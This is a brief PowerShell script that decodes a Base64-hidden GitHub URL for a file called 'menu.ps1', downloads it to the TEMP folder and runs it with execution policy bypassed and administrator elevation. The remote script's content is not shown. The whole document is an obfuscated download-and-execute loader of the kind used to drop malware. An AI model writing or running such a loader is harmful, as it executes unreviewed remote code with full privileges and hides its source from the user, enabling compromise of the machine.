$enlaceCodificado = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkZ2FyZEphbWVuL1JFUEFSQU5ETzIwMjUvcmVmcy9oZWFkcy9tYWluL21lbnUucHMx"
$enlaceOriginal = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enlaceCodificado))

Invoke-WebRequest -Uri $enlaceOriginal -OutFile "$env:TEMP\menu.ps1"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\menu.ps1" `
    -WindowStyle Normal -Verb RunAs
